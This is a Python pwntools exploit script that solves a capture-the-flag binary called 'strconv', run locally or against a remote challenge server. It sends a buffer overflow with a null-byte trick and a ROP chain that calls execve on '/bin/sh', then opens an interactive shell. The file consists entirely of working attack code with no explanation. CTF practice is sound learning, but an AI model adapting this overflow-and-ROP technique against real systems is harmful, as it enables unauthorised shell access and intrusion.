#!/usr/bin/env python3

from pwn import *

exe = ELF("./strconv")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("strconv.challs.cyberchallenge.it", 37000)

    return r


def main():
    r = conn()
    rop = ROP(exe)

    padding = b'A' * 262    # 264 but we subtract 2 for "A\x00" since we don't want the case change
    
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx_rbx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]    # Couldn't find anything better
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    bin_sh = next(exe.search(b'/bin/sh'))
    
    payload = p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'Input : ', b"A\x00" + padding + payload)
    r.sendlineafter(b'> ', b'0')

    r.interactive('> ')


if __name__ == "__main__":
    main()
